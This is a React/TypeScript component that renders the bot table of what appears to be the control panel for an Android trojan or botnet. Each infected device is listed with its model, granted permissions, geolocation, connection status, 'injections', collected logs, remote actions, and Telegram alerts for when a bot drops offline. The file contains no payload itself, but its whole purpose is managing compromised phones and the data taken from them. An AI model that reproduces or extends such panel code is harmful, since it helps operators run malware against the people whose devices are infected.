import React, {Dispatch, SetStateAction, useState} from "react";
import {Button, Checkbox, Space, Table, Tag} from "antd";
import {Bot} from "../../../Model/Bot";
import {AppState} from "../../../Store/RootReducer";
import Permissions from "./Permissions";
import Information from "./Information";
import moment from "moment-timezone";
import Injections from "./Injections";
import BotDataButtons from "./BotDataButtons";
import Actions from "./Actions";
import {useTranslation} from "react-i18next";
import {scrollToTop} from "../../../Util/scrollToTop";
import {setBotPage} from "../../../Store/Bots/Actions";
import BotInfo from "../../Modals/BotInfo/BotInfo";
import Spinner from "../../Misc/Spinner";
import SubInfo from "./SubInfo";
import {showBotGeo} from "./BotsItem";
import {useAppSelector} from "../../../Hook/useAppSelector";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {LogButtonsProps} from "../../../Model/Commands";
import {updateUserTelegramBot} from "../../../Store/Auth/Actions";

interface BotsTableProps {
    isLoaded: boolean,
    bots: Bot[],
    logsList: LogButtonsProps[],
    setSelectedBot: Dispatch<SetStateAction<Bot>>,
    setShowModal: (modal: string, show: boolean) => void,
}

const BotsTable: React.FC<BotsTableProps> = (props: BotsTableProps) => {
    const botsReducer = useAppSelector((state: AppState) => state.bots);
    const authReducer = useAppSelector((state: AppState) => state.auth);
    const dispatch = useAppDispatch();
    const {t} = useTranslation();
    const [showBotInfo, setShowBotInfo] = useState(false);
    const [botData, setBotData] = useState<Bot>();
    const showBotInfoModal = (bot: Bot) => {
        setBotData(bot);
        setShowBotInfo(true);
    };

    const columns = [
        {
            title: "# ID",
            dataIndex: "id",
            key: "id",
            render: (id: string, bot: Bot) => {
                const lastConnectionDiff = moment().diff(moment(bot.updated_at)) / 1000;
                const lastConnectionStatus = lastConnectionDiff <= 60 ? "online" : (lastConnectionDiff >= 144000 ? "uninstalled": "offline");

                return (
                    <div className={"table-col " + lastConnectionStatus}>
                        <div className="table-col-item">
                            <h3>ID</h3>
                        </div>
                        <div className="table-col-item">
                            <Space>
                                <span className="icon-bots-information-model" />
                                <span onClick={() => showBotInfoModal(bot)}>
                                    <a>{id}</a>
                                </span>
                            </Space>
                            <div style={{display: "flex", alignItems: "center", gap: 8}}>
                                <div className="bot-item-status" />
                                <span>{lastConnectionStatus}</span>
                                <Tag color="success">{bot.tag}</Tag>
                            </div>
                            <Space>
                                <div
                                    className="app-icon"
                                    style={{
                                        backgroundImage: `url(https://purecatamphetamine.github.io/country-flag-icons/3x2/${bot.country_code.toUpperCase()}.svg)`,
                                        height: 11,
                                    }}
                                />

                                <span>{bot.country} / {bot.country_code.toUpperCase()}</span>
                            </Space>
                            {bot.location !== null && (
                                <div>
                                    <Button
                                        icon={(
                                            <span className="anticon">
                                                <i className="fa-solid fa-sharp fa-location-dot" />
                                            </span>
                                        )}
                                        onClick={() => showBotGeo(bot)}
                                    >
                                        {t("GEOLOCATION")}
                                    </Button>
                                </div>
                            )}
                        </div>
                    </div>
                );
            },
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-robot" /> {t("BOTS_TABLE_DEVICE")}
                </>
            ),
            dataIndex: "device_data",
            key: "device_data",
            render: (text: string, bot: Bot) => {
                const screenResolution = bot.metadata?.screenResolution;

                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("BOTS_TABLE_DEVICE")}</h3>
                        </div>
                        <div className="table-col-item">
                            <div><span className="icon-bots-information-model" /> {bot.metadata.android}</div>
                            <div><span className="fa-solid fa-mobile" /> {bot.metadata.device}</div>
                            {screenResolution && (
                                <div>
                                    <i className="fa-solid fa-mobile-screen" />&nbsp;
                                    <span>
                                        {screenResolution?.width}x{screenResolution?.height}
                                    </span>
                                </div>
                            )}
                        </div>
                    </div>
                );
            },
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-lock-open" /> {t("BOTS_TABLE_PERMISSIONS")}
                </>
            ),
            dataIndex: "permissions",
            key: "permissions",
            render: (permissions: string, bot: Bot) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("BOTS_TABLE_PERMISSIONS")}</h3>
                        </div>
                        <div className="table-col-item table-items">
                            <Permissions bot={bot} />
                        </div>
                    </div>
                );
            },
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-info-circle" /> {t("BOT_SUB_INFO")}
                </>
            ),
            dataIndex: "sub_info",
            key: "sub_info",
            render: (permissions: string, bot: Bot) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("BOT_SUB_INFO")}</h3>
                        </div>
                        <div className="table-col-item table-items">
                            <SubInfo bot={bot} />
                        </div>
                    </div>
                );
            },
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-earth-americas" /> {t("BOTS_TABLE_STATUS")}
                </>
            ),
            dataIndex: "status",
            key: "status",
            render: (status: string, bot: Bot) => {
                const lastConnectionDiff = moment().diff(moment(bot.updated_at)) / 1000;
                const lastConnectionStatus = lastConnectionDiff <= 60 ? "online" : (lastConnectionDiff >= 144000 ? "uninstalled": "offline");

                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("BOTS_TABLE_STATUS")}</h3>
                        </div>
                        <div className="table-col-item">
                            <Information bot={bot} lastConnectionDiff={lastConnectionDiff} renderType="table"/>

                            {lastConnectionStatus === "uninstalled" || lastConnectionStatus === "offline" ? (
                                <Checkbox
                                    checked={authReducer.user.telegramBots.includes(bot.id)}
                                    onChange={
                                        (e) => {
                                            dispatch(updateUserTelegramBot(
                                                e.target.checked,
                                                bot.id,
                                            ));
                                        }
                                    }
                                    className="ant-checkbox-tg"
                                >
                                    {t("NOTIFY_TELEGRAM")}
                                </Checkbox>
                            ) : ""}
                        </div>
                    </div>
                );
            },
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-syringe" /> {t("BOTS_TABLE_INJECTIONS")}
                </>
            ),
            dataIndex: "injections",
            key: "injections",
            render: (injections: string, bot: Bot) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("BOTS_TABLE_INJECTIONS")}</h3>
                        </div>
                        <div className="table-col-item">
                            <Injections bot={bot} renderType="table" />
                        </div>
                    </div>
                );
            },
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-receipt" /> {t("BOTS_TABLE_LOGS")}
                </>
            ),
            dataIndex: "logs",
            key: "logs",
            render: (logs: string, bot: Bot) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("BOTS_TABLE_LOGS")}</h3>
                        </div>
                        <div className="table-col-item table-items">
                            <BotDataButtons
                                bot={bot}
                                logsList={props.logsList}
                                setSelectedBot={props.setSelectedBot}
                                setShowModal={props.setShowModal}
                            />
                        </div>
                    </div>
                );
            },
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-gear" /> {t("BOTS_TABLE_ACTIONS")}
                </>
            ),
            dataIndex: "actions",
            key: "actions",
            render: (text: string, bot: Bot) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("BOTS_TABLE_ACTIONS")}</h3>
                        </div>
                        <div className="table-col-item table-items">
                            <Actions bot={bot} />
                        </div>
                    </div>
                );
            },
        },
    ];

    const rowSelection = {
        onChange: () => {},
    };

    const paginationChangeHandler = (pageNumber: number, size: number) => {
        if (botsReducer.isLoaded &&
            botsReducer.page === botsReducer.loaded_page &&
            botsReducer.page === botsReducer.loaded_page &&
            botsReducer.loaded_per_page === botsReducer.per_page) {
            scrollToTop();
            dispatch(setBotPage(pageNumber, size));
        }
    };

    return (
        <>
            <Table
                columns={columns}
                dataSource={botsReducer.bots}
                bordered={false}
                loading={{
                    spinning: !props.isLoaded,
                    indicator: <Spinner preloader={true} />,
                }}
                size="large"
                pagination={{
                    current: botsReducer.page,
                    total: botsReducer.total,
                    defaultPageSize: botsReducer.per_page,
                    onChange: paginationChangeHandler,
                    position: ["topLeft", "bottomLeft"],
                    showSizeChanger: true,
                    locale: {
                        items_per_page: "",
                    },
                }}
                rowKey="id"
                rowSelection={{
                    ...rowSelection,
                }}
                locale={{
                    emptyText: (
                        <Space>
                            <i className="fa-solid fa-robot" /> {t("TABLE_EMPTY")}
                        </Space>
                    ),
                }}
            />
            <br />

            {botData && (
                <BotInfo bot={botData} visible={showBotInfo} setVisible={setShowBotInfo} />
            )}
        </>
    );
};

export default BotsTable;
